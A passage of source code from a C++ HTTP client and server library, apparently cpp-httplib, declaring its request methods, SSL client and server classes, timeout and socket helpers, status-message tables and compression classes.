      ContentProvider content_provider,
      ContentProviderWithoutLength content_provider_without_length,
      const std::string &amp;content_type, Progress progress);
  ContentProviderWithoutLength get_multipart_content_provider(
      const std::string &amp;boundary, const MultipartFormDataItems &amp;items,
      const MultipartFormDataProviderItems &amp;provider_items) const;

  std::string adjust_host_string(const std::string &amp;host) const;

  virtual bool
  process_socket(const Socket &amp;socket,
                 std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
                 std::function&lt;bool(Stream &amp;strm)&gt; callback);
  virtual bool is_ssl() const;
};

class Client {
public:
  // Universal interface
  explicit Client(const std::string &amp;scheme_host_port);

  explicit Client(const std::string &amp;scheme_host_port,
                  const std::string &amp;client_cert_path,
                  const std::string &amp;client_key_path);

  // HTTP only interface
  explicit Client(const std::string &amp;host, int port);

  explicit Client(const std::string &amp;host, int port,
                  const std::string &amp;client_cert_path,
                  const std::string &amp;client_key_path);

  Client(Client &amp;&amp;) = default;
  Client &amp;operator=(Client &amp;&amp;) = default;

  ~Client();

  bool is_valid() const;

  Result Get(const std::string &amp;path);
  Result Get(const std::string &amp;path, const Headers &amp;headers);
  Result Get(const std::string &amp;path, Progress progress);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             Progress progress);
  Result Get(const std::string &amp;path, ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, ContentReceiver content_receiver,
             Progress progress);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ContentReceiver content_receiver, Progress progress);
  Result Get(const std::string &amp;path, ResponseHandler response_handler,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ResponseHandler response_handler,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ResponseHandler response_handler, ContentReceiver content_receiver,
             Progress progress);
  Result Get(const std::string &amp;path, ResponseHandler response_handler,
             ContentReceiver content_receiver, Progress progress);

  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, Progress progress = nullptr);
  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, ContentReceiver content_receiver,
             Progress progress = nullptr);
  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, ResponseHandler response_handler,
             ContentReceiver content_receiver, Progress progress = nullptr);

  Result Head(const std::string &amp;path);
  Result Head(const std::string &amp;path, const Headers &amp;headers);

  Result Post(const std::string &amp;path);
  Result Post(const std::string &amp;path, const Headers &amp;headers);
  Result Post(const std::string &amp;path, const char *body, size_t content_length,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers, const char *body,
              size_t content_length, const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers, const char *body,
              size_t content_length, const std::string &amp;content_type,
              Progress progress);
  Result Post(const std::string &amp;path, const std::string &amp;body,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const std::string &amp;body,
              const std::string &amp;content_type, Progress progress);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const std::string &amp;body, const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const std::string &amp;body, const std::string &amp;content_type,
              Progress progress);
  Result Post(const std::string &amp;path, size_t content_length,
              ContentProvider content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path,
              ContentProviderWithoutLength content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              size_t content_length, ContentProvider content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              ContentProviderWithoutLength content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Params &amp;params);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const Params &amp;params);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const Params &amp;params, Progress progress);
  Result Post(const std::string &amp;path, const MultipartFormDataItems &amp;items);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items, const std::string &amp;boundary);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items,
              const MultipartFormDataProviderItems &amp;provider_items);

  Result Put(const std::string &amp;path);
  Result Put(const std::string &amp;path, const char *body, size_t content_length,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers, const char *body,
             size_t content_length, const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers, const char *body,
             size_t content_length, const std::string &amp;content_type,
             Progress progress);
  Result Put(const std::string &amp;path, const std::string &amp;body,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const std::string &amp;body,
             const std::string &amp;content_type, Progress progress);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const std::string &amp;body, const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const std::string &amp;body, const std::string &amp;content_type,
             Progress progress);
  Result Put(const std::string &amp;path, size_t content_length,
             ContentProvider content_provider, const std::string &amp;content_type);
  Result Put(const std::string &amp;path,
             ContentProviderWithoutLength content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             size_t content_length, ContentProvider content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             ContentProviderWithoutLength content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Params &amp;params);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const Params &amp;params);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const Params &amp;params, Progress progress);
  Result Put(const std::string &amp;path, const MultipartFormDataItems &amp;items);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items, const std::string &amp;boundary);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items,
             const MultipartFormDataProviderItems &amp;provider_items);

  Result Patch(const std::string &amp;path);
  Result Patch(const std::string &amp;path, const char *body, size_t content_length,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const char *body, size_t content_length,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const char *body, size_t content_length,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const char *body, size_t content_length,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const std::string &amp;body,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const std::string &amp;body,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const std::string &amp;body, const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const std::string &amp;body, const std::string &amp;content_type,
               Progress progress);
  Result Patch(const std::string &amp;path, size_t content_length,
               ContentProvider content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path,
               ContentProviderWithoutLength content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               size_t content_length, ContentProvider content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               ContentProviderWithoutLength content_provider,
               const std::string &amp;content_type);

  Result Delete(const std::string &amp;path);
  Result Delete(const std::string &amp;path, const Headers &amp;headers);
  Result Delete(const std::string &amp;path, const char *body,
                size_t content_length, const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const char *body,
                size_t content_length, const std::string &amp;content_type,
                Progress progress);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const char *body, size_t content_length,
                const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const char *body, size_t content_length,
                const std::string &amp;content_type, Progress progress);
  Result Delete(const std::string &amp;path, const std::string &amp;body,
                const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const std::string &amp;body,
                const std::string &amp;content_type, Progress progress);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const std::string &amp;body, const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const std::string &amp;body, const std::string &amp;content_type,
                Progress progress);

  Result Options(const std::string &amp;path);
  Result Options(const std::string &amp;path, const Headers &amp;headers);

  bool send(Request &amp;req, Response &amp;res, Error &amp;error);
  Result send(const Request &amp;req);

  void stop();

  std::string host() const;
  int port() const;

  size_t is_socket_open() const;
  socket_t socket() const;

  void set_hostname_addr_map(std::map&lt;std::string, std::string&gt; addr_map);

  void set_default_headers(Headers headers);

  void
  set_header_writer(std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer);

  void set_address_family(int family);
  void set_tcp_nodelay(bool on);
  void set_socket_options(SocketOptions socket_options);

  void set_connection_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void
  set_connection_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_read_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void set_read_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_write_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void set_write_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_max_timeout(time_t msec);
  template &lt;class Rep, class Period&gt;
  void set_max_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_basic_auth(const std::string &amp;username, const std::string &amp;password);
  void set_bearer_token_auth(const std::string &amp;token);
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_digest_auth(const std::string &amp;username,
                       const std::string &amp;password);
#endif

  void set_keep_alive(bool on);
  void set_follow_location(bool on);

  void set_url_encode(bool on);

  void set_compress(bool on);

  void set_decompress(bool on);

  void set_interface(const std::string &amp;intf);

  void set_proxy(const std::string &amp;host, int port);
  void set_proxy_basic_auth(const std::string &amp;username,
                            const std::string &amp;password);
  void set_proxy_bearer_token_auth(const std::string &amp;token);
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_proxy_digest_auth(const std::string &amp;username,
                             const std::string &amp;password);
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void enable_server_certificate_verification(bool enabled);
  void enable_server_hostname_verification(bool enabled);
  void set_server_certificate_verifier(std::function&lt;bool(SSL *ssl)&gt; verifier);
#endif

  void set_logger(Logger logger);

  // SSL
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_ca_cert_path(const std::string &amp;ca_cert_file_path,
                        const std::string &amp;ca_cert_dir_path = std::string());

  void set_ca_cert_store(X509_STORE *ca_cert_store);
  void load_ca_cert_store(const char *ca_cert, std::size_t size);

  long get_openssl_verify_result() const;

  SSL_CTX *ssl_context() const;
#endif

private:
  std::unique_ptr&lt;ClientImpl&gt; cli_;

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  bool is_ssl_ = false;
#endif
};

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
class SSLServer : public Server {
public:
  SSLServer(const char *cert_path, const char *private_key_path,
            const char *client_ca_cert_file_path = nullptr,
            const char *client_ca_cert_dir_path = nullptr,
            const char *private_key_password = nullptr);

  SSLServer(X509 *cert, EVP_PKEY *private_key,
            X509_STORE *client_ca_cert_store = nullptr);

  SSLServer(
      const std::function&lt;bool(SSL_CTX &amp;ssl_ctx)&gt; &amp;setup_ssl_ctx_callback);

  ~SSLServer() override;

  bool is_valid() const override;

  SSL_CTX *ssl_context() const;

  void update_certs(X509 *cert, EVP_PKEY *private_key,
                    X509_STORE *client_ca_cert_store = nullptr);

private:
  bool process_and_close_socket(socket_t sock) override;

  SSL_CTX *ctx_;
  std::mutex ctx_mutex_;
};

class SSLClient final : public ClientImpl {
public:
  explicit SSLClient(const std::string &amp;host);

  explicit SSLClient(const std::string &amp;host, int port);

  explicit SSLClient(const std::string &amp;host, int port,
                     const std::string &amp;client_cert_path,
                     const std::string &amp;client_key_path,
                     const std::string &amp;private_key_password = std::string());

  explicit SSLClient(const std::string &amp;host, int port, X509 *client_cert,
                     EVP_PKEY *client_key,
                     const std::string &amp;private_key_password = std::string());

  ~SSLClient() override;

  bool is_valid() const override;

  void set_ca_cert_store(X509_STORE *ca_cert_store);
  void load_ca_cert_store(const char *ca_cert, std::size_t size);

  long get_openssl_verify_result() const;

  SSL_CTX *ssl_context() const;

private:
  bool create_and_connect_socket(Socket &amp;socket, Error &amp;error) override;
  void shutdown_ssl(Socket &amp;socket, bool shutdown_gracefully) override;
  void shutdown_ssl_impl(Socket &amp;socket, bool shutdown_gracefully);

  bool
  process_socket(const Socket &amp;socket,
                 std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
                 std::function&lt;bool(Stream &amp;strm)&gt; callback) override;
  bool is_ssl() const override;

  bool connect_with_proxy(
      Socket &amp;sock,
      std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
      Response &amp;res, bool &amp;success, Error &amp;error);
  bool initialize_ssl(Socket &amp;socket, Error &amp;error);

  bool load_certs();

  bool verify_host(X509 *server_cert) const;
  bool verify_host_with_subject_alt_name(X509 *server_cert) const;
  bool verify_host_with_common_name(X509 *server_cert) const;
  bool check_host_name(const char *pattern, size_t pattern_len) const;

  SSL_CTX *ctx_;
  std::mutex ctx_mutex_;
  std::once_flag initialize_cert_;

  std::vector&lt;std::string&gt; host_components_;

  long verify_result_ = 0;

  friend class ClientImpl;
};
#endif

/*
 * Implementation of template methods.
 */

namespace detail {

template &lt;typename T, typename U&gt;
inline void duration_to_sec_and_usec(const T &amp;duration, U callback) {
  auto sec = std::chrono::duration_cast&lt;std::chrono::seconds&gt;(duration).count();
  auto usec = std::chrono::duration_cast&lt;std::chrono::microseconds&gt;(
                  duration - std::chrono::seconds(sec))
                  .count();
  callback(static_cast&lt;time_t&gt;(sec), static_cast&lt;time_t&gt;(usec));
}

inline bool is_numeric(const std::string &amp;str) {
  return !str.empty() &amp;&amp; std::all_of(str.begin(), str.end(), ::isdigit);
}

inline uint64_t get_header_value_u64(const Headers &amp;headers,
                                     const std::string &amp;key, uint64_t def,
                                     size_t id, bool &amp;is_invalid_value) {
  is_invalid_value = false;
  auto rng = headers.equal_range(key);
  auto it = rng.first;
  std::advance(it, static_cast&lt;ssize_t&gt;(id));
  if (it != rng.second) {
    if (is_numeric(it-&gt;second)) {
      return std::strtoull(it-&gt;second.data(), nullptr, 10);
    } else {
      is_invalid_value = true;
    }
  }
  return def;
}

inline uint64_t get_header_value_u64(const Headers &amp;headers,
                                     const std::string &amp;key, uint64_t def,
                                     size_t id) {
  bool dummy = false;
  return get_header_value_u64(headers, key, def, id, dummy);
}

} // namespace detail

inline uint64_t Request::get_header_value_u64(const std::string &amp;key,
                                              uint64_t def, size_t id) const {
  return detail::get_header_value_u64(headers, key, def, id);
}

inline uint64_t Response::get_header_value_u64(const std::string &amp;key,
                                               uint64_t def, size_t id) const {
  return detail::get_header_value_u64(headers, key, def, id);
}

namespace detail {

inline bool set_socket_opt_impl(socket_t sock, int level, int optname,
                                const void *optval, socklen_t optlen) {
  return setsockopt(sock, level, optname,
#ifdef _WIN32
                    reinterpret_cast&lt;const char *&gt;(optval),
#else
                    optval,
#endif
                    optlen) == 0;
}

inline bool set_socket_opt(socket_t sock, int level, int optname, int optval) {
  return set_socket_opt_impl(sock, level, optname, &amp;optval, sizeof(optval));
}

inline bool set_socket_opt_time(socket_t sock, int level, int optname,
                                time_t sec, time_t usec) {
#ifdef _WIN32
  auto timeout = static_cast&lt;uint32_t&gt;(sec * 1000 + usec / 1000);
#else
  timeval timeout;
  timeout.tv_sec = static_cast&lt;long&gt;(sec);
  timeout.tv_usec = static_cast&lt;decltype(timeout.tv_usec)&gt;(usec);
#endif
  return set_socket_opt_impl(sock, level, optname, &amp;timeout, sizeof(timeout));
}

} // namespace detail

inline void default_socket_options(socket_t sock) {
  detail::set_socket_opt(sock, SOL_SOCKET,
#ifdef SO_REUSEPORT
                         SO_REUSEPORT,
#else
                         SO_REUSEADDR,
#endif
                         1);
}

inline const char *status_message(int status) {
  switch (status) {
  case StatusCode::Continue_100: return "Continue";
  case StatusCode::SwitchingProtocol_101: return "Switching Protocol";
  case StatusCode::Processing_102: return "Processing";
  case StatusCode::EarlyHints_103: return "Early Hints";
  case StatusCode::OK_200: return "OK";
  case StatusCode::Created_201: return "Created";
  case StatusCode::Accepted_202: return "Accepted";
  case StatusCode::NonAuthoritativeInformation_203:
    return "Non-Authoritative Information";
  case StatusCode::NoContent_204: return "No Content";
  case StatusCode::ResetContent_205: return "Reset Content";
  case StatusCode::PartialContent_206: return "Partial Content";
  case StatusCode::MultiStatus_207: return "Multi-Status";
  case StatusCode::AlreadyReported_208: return "Already Reported";
  case StatusCode::IMUsed_226: return "IM Used";
  case StatusCode::MultipleChoices_300: return "Multiple Choices";
  case StatusCode::MovedPermanently_301: return "Moved Permanently";
  case StatusCode::Found_302: return "Found";
  case StatusCode::SeeOther_303: return "See Other";
  case StatusCode::NotModified_304: return "Not Modified";
  case StatusCode::UseProxy_305: return "Use Proxy";
  case StatusCode::unused_306: return "unused";
  case StatusCode::TemporaryRedirect_307: return "Temporary Redirect";
  case StatusCode::PermanentRedirect_308: return "Permanent Redirect";
  case StatusCode::BadRequest_400: return "Bad Request";
  case StatusCode::Unauthorized_401: return "Unauthorized";
  case StatusCode::PaymentRequired_402: return "Payment Required";
  case StatusCode::Forbidden_403: return "Forbidden";
  case StatusCode::NotFound_404: return "Not Found";
  case StatusCode::MethodNotAllowed_405: return "Method Not Allowed";
  case StatusCode::NotAcceptable_406: return "Not Acceptable";
  case StatusCode::ProxyAuthenticationRequired_407:
    return "Proxy Authentication Required";
  case StatusCode::RequestTimeout_408: return "Request Timeout";
  case StatusCode::Conflict_409: return "Conflict";
  case StatusCode::Gone_410: return "Gone";
  case StatusCode::LengthRequired_411: return "Length Required";
  case StatusCode::PreconditionFailed_412: return "Precondition Failed";
  case StatusCode::PayloadTooLarge_413: return "Payload Too Large";
  case StatusCode::UriTooLong_414: return "URI Too Long";
  case StatusCode::UnsupportedMediaType_415: return "Unsupported Media Type";
  case StatusCode::RangeNotSatisfiable_416: return "Range Not Satisfiable";
  case StatusCode::ExpectationFailed_417: return "Expectation Failed";
  case StatusCode::ImATeapot_418: return "I'm a teapot";
  case StatusCode::MisdirectedRequest_421: return "Misdirected Request";
  case StatusCode::UnprocessableContent_422: return "Unprocessable Content";
  case StatusCode::Locked_423: return "Locked";
  case StatusCode::FailedDependency_424: return "Failed Dependency";
  case StatusCode::TooEarly_425: return "Too Early";
  case StatusCode::UpgradeRequired_426: return "Upgrade Required";
  case StatusCode::PreconditionRequired_428: return "Precondition Required";
  case StatusCode::TooManyRequests_429: return "Too Many Requests";
  case StatusCode::RequestHeaderFieldsTooLarge_431:
    return "Request Header Fields Too Large";
  case StatusCode::UnavailableForLegalReasons_451:
    return "Unavailable For Legal Reasons";
  case StatusCode::NotImplemented_501: return "Not Implemented";
  case StatusCode::BadGateway_502: return "Bad Gateway";
  case StatusCode::ServiceUnavailable_503: return "Service Unavailable";
  case StatusCode::GatewayTimeout_504: return "Gateway Timeout";
  case StatusCode::HttpVersionNotSupported_505:
    return "HTTP Version Not Supported";
  case StatusCode::VariantAlsoNegotiates_506: return "Variant Also Negotiates";
  case StatusCode::InsufficientStorage_507: return "Insufficient Storage";
  case StatusCode::LoopDetected_508: return "Loop Detected";
  case StatusCode::NotExtended_510: return "Not Extended";
  case StatusCode::NetworkAuthenticationRequired_511:
    return "Network Authentication Required";

  default:
  case StatusCode::InternalServerError_500: return "Internal Server Error";
  }
}

inline std::string get_bearer_token_auth(const Request &amp;req) {
  if (req.has_header("Authorization")) {
    static std::string BearerHeaderPrefix = "Bearer ";
    return req.get_header_value("Authorization")
        .substr(BearerHeaderPrefix.length());
  }
  return "";
}

template &lt;class Rep, class Period&gt;
inline Server &amp;
Server::set_read_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(
      duration, [&amp;](time_t sec, time_t usec) { set_read_timeout(sec, usec); });
  return *this;
}

template &lt;class Rep, class Period&gt;
inline Server &amp;
Server::set_write_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(
      duration, [&amp;](time_t sec, time_t usec) { set_write_timeout(sec, usec); });
  return *this;
}

template &lt;class Rep, class Period&gt;
inline Server &amp;
Server::set_idle_interval(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(
      duration, [&amp;](time_t sec, time_t usec) { set_idle_interval(sec, usec); });
  return *this;
}

inline std::string to_string(const Error error) {
  switch (error) {
  case Error::Success: return "Success (no error)";
  case Error::Connection: return "Could not establish connection";
  case Error::BindIPAddress: return "Failed to bind IP address";
  case Error::Read: return "Failed to read connection";
  case Error::Write: return "Failed to write connection";
  case Error::ExceedRedirectCount: return "Maximum redirect count exceeded";
  case Error::Canceled: return "Connection handling canceled";
  case Error::SSLConnection: return "SSL connection failed";
  case Error::SSLLoadingCerts: return "SSL certificate loading failed";
  case Error::SSLServerVerification: return "SSL server verification failed";
  case Error::SSLServerHostnameVerification:
    return "SSL server hostname verification failed";
  case Error::UnsupportedMultipartBoundaryChars:
    return "Unsupported HTTP multipart boundary characters";
  case Error::Compression: return "Compression failed";
  case Error::ConnectionTimeout: return "Connection timed out";
  case Error::ProxyConnection: return "Proxy connection failed";
  case Error::Unknown: return "Unknown";
  default: break;
  }

  return "Invalid";
}

inline std::ostream &amp;operator&lt;&lt;(std::ostream &amp;os, const Error &amp;obj) {
  os &lt;&lt; to_string(obj);
  os &lt;&lt; " (" &lt;&lt; static_cast&lt;std::underlying_type&lt;Error&gt;::type&gt;(obj) &lt;&lt; ')';
  return os;
}

inline uint64_t Result::get_request_header_value_u64(const std::string &amp;key,
                                                     uint64_t def,
                                                     size_t id) const {
  return detail::get_header_value_u64(request_headers_, key, def, id);
}

template &lt;class Rep, class Period&gt;
inline void ClientImpl::set_connection_timeout(
    const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(duration, [&amp;](time_t sec, time_t usec) {
    set_connection_timeout(sec, usec);
  });
}

template &lt;class Rep, class Period&gt;
inline void ClientImpl::set_read_timeout(
    const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(
      duration, [&amp;](time_t sec, time_t usec) { set_read_timeout(sec, usec); });
}

template &lt;class Rep, class Period&gt;
inline void ClientImpl::set_write_timeout(
    const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  detail::duration_to_sec_and_usec(
      duration, [&amp;](time_t sec, time_t usec) { set_write_timeout(sec, usec); });
}

template &lt;class Rep, class Period&gt;
inline void ClientImpl::set_max_timeout(
    const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  auto msec =
      std::chrono::duration_cast&lt;std::chrono::milliseconds&gt;(duration).count();
  set_max_timeout(msec);
}

template &lt;class Rep, class Period&gt;
inline void Client::set_connection_timeout(
    const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  cli_-&gt;set_connection_timeout(duration);
}

template &lt;class Rep, class Period&gt;
inline void
Client::set_read_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  cli_-&gt;set_read_timeout(duration);
}

template &lt;class Rep, class Period&gt;
inline void
Client::set_write_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  cli_-&gt;set_write_timeout(duration);
}

template &lt;class Rep, class Period&gt;
inline void
Client::set_max_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration) {
  cli_-&gt;set_max_timeout(duration);
}

/*
 * Forward declarations and types that will be part of the .h file if split into
 * .h + .cc.
 */

std::string hosted_at(const std::string &amp;hostname);

void hosted_at(const std::string &amp;hostname, std::vector&lt;std::string&gt; &amp;addrs);

std::string append_query_params(const std::string &amp;path, const Params &amp;params);

std::pair&lt;std::string, std::string&gt; make_range_header(const Ranges &amp;ranges);

std::pair&lt;std::string, std::string&gt;
make_basic_authentication_header(const std::string &amp;username,
                                 const std::string &amp;password,
                                 bool is_proxy = false);

namespace detail {

#if defined(_WIN32)
inline std::wstring u8string_to_wstring(const char *s) {
  std::wstring ws;
  auto len = static_cast&lt;int&gt;(strlen(s));
  auto wlen = ::MultiByteToWideChar(CP_UTF8, 0, s, len, nullptr, 0);
  if (wlen &gt; 0) {
    ws.resize(wlen);
    wlen = ::MultiByteToWideChar(
        CP_UTF8, 0, s, len,
        const_cast&lt;LPWSTR&gt;(reinterpret_cast&lt;LPCWSTR&gt;(ws.data())), wlen);
    if (wlen != static_cast&lt;int&gt;(ws.size())) { ws.clear(); }
  }
  return ws;
}
#endif

struct FileStat {
  FileStat(const std::string &amp;path);
  bool is_file() const;
  bool is_dir() const;

private:
#if defined(_WIN32)
  struct _stat st_;
#else
  struct stat st_;
#endif
  int ret_ = -1;
};

std::string encode_query_param(const std::string &amp;value);

std::string decode_url(const std::string &amp;s, bool convert_plus_to_space);

void read_file(const std::string &amp;path, std::string &amp;out);

std::string trim_copy(const std::string &amp;s);

void divide(
    const char *data, std::size_t size, char d,
    std::function&lt;void(const char *, std::size_t, const char *, std::size_t)&gt;
        fn);

void divide(
    const std::string &amp;str, char d,
    std::function&lt;void(const char *, std::size_t, const char *, std::size_t)&gt;
        fn);

void split(const char *b, const char *e, char d,
           std::function&lt;void(const char *, const char *)&gt; fn);

void split(const char *b, const char *e, char d, size_t m,
           std::function&lt;void(const char *, const char *)&gt; fn);

bool process_client_socket(
    socket_t sock, time_t read_timeout_sec, time_t read_timeout_usec,
    time_t write_timeout_sec, time_t write_timeout_usec,
    time_t max_timeout_msec,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
    std::function&lt;bool(Stream &amp;)&gt; callback);

socket_t create_client_socket(const std::string &amp;host, const std::string &amp;ip,
                              int port, int address_family, bool tcp_nodelay,
                              bool ipv6_v6only, SocketOptions socket_options,
                              time_t connection_timeout_sec,
                              time_t connection_timeout_usec,
                              time_t read_timeout_sec, time_t read_timeout_usec,
                              time_t write_timeout_sec,
                              time_t write_timeout_usec,
                              const std::string &amp;intf, Error &amp;error);

const char *get_header_value(const Headers &amp;headers, const std::string &amp;key,
                             const char *def, size_t id);

std::string params_to_query_str(const Params &amp;params);

void parse_query_text(const char *data, std::size_t size, Params &amp;params);

void parse_query_text(const std::string &amp;s, Params &amp;params);

bool parse_multipart_boundary(const std::string &amp;content_type,
                              std::string &amp;boundary);

bool parse_range_header(const std::string &amp;s, Ranges &amp;ranges);

int close_socket(socket_t sock);

ssize_t send_socket(socket_t sock, const void *ptr, size_t size, int flags);

ssize_t read_socket(socket_t sock, void *ptr, size_t size, int flags);

enum class EncodingType { None = 0, Gzip, Brotli };

EncodingType encoding_type(const Request &amp;req, const Response &amp;res);

class BufferStream final : public Stream {
public:
  BufferStream() = default;
  ~BufferStream() override = default;

  bool is_readable() const override;
  bool is_writable() const override;
  ssize_t read(char *ptr, size_t size) override;
  ssize_t write(const char *ptr, size_t size) override;
  void get_remote_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  void get_local_ip_and_port(std::string &amp;ip, int &amp;port) const override;
  socket_t socket() const override;
  time_t duration() const override;

  const std::string &amp;get_buffer() const;

private:
  std::string buffer;
  size_t position = 0;
};

class compressor {
public:
  virtual ~compressor() = default;

  typedef std::function&lt;bool(const char *data, size_t data_len)&gt; Callback;
  virtual bool compress(const char *data, size_t data_length, bool last,
                        Callback callback) = 0;
};

class decompressor {
public:
  virtual ~decompressor() = default;

  virtual bool is_valid() const = 0;

  typedef std::function&lt;bool(const char *data, size_t data_len)&gt; Callback;
  virtual bool decompress(const char *data, size_t data_length,
                          Callback callback) = 0;
};

class nocompressor final : public compressor {
public:
  ~nocompressor() override = default;

  bool compress(const char *data, size_t data_length, bool /*last*/,
                Callback callback) override;
};

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
class gzip_compressor final : public compressor {
public:
  gzip_compressor();
  ~gzip_compressor() override;

  bool compress(const char *data, size_t data_length, bool last,
                Callback callback) override;

private:
  bool is_valid_ = false;
  z_stream strm_;
};

class gzip_decompressor final : public decompressor {
public:
  gzip_decompressor();
  ~gzip_decompressor() override;

  bool is_valid() const override;

  bool decompress(const char *data, size_t data_length,
                  Callback callback) override;

private:
  bool is_valid_ = false;
  z_stream strm_;
};
#endif

#ifdef CPPHTTPLIB_BROTLI_SUPPORT
class brotli_compressor final : public compressor {
public:
  brotli_compressor();
  ~brotli_compressor();

  bool compress(const char *data, size_t data_length, bool last,
                Callback callback) override;

private:
  BrotliEncoderState *state_ = nullptr;
};

class brotli_decompressor final : public decompressor {
public:
  brotli_decompressor();
  ~brotli_decompressor();

  bool is_valid() const override;

  bool decompress(const char *data, size_t data_length,
                  Callback callback) override;

private:
  BrotliDecoderResult decoder_r;
  BrotliDecoderState *decoder_s = nullptr;
};
#endif

// NOTE: until the read size reaches `fixed_buffer_size`, use `fixed_buffer`
// to store data. The call can set memory on stack for performance.
class stream_line_reader {
public:
  stream_line_reader(Stream &amp;strm, char *fixed_buffer,
                     size_t fixed_buffer_size);
  const char *ptr() const;
  size_t size() const;
  bool end_with_crlf() const;
  bool getline();

private:
  void append(char c);

  Stream &amp;strm_;
  char *fixed_buffer_;
  const size_t fixed_buffer_size_;
  size_t fixed_buffer_used_size_ = 0;
  std::string glowable_buffer_;
};

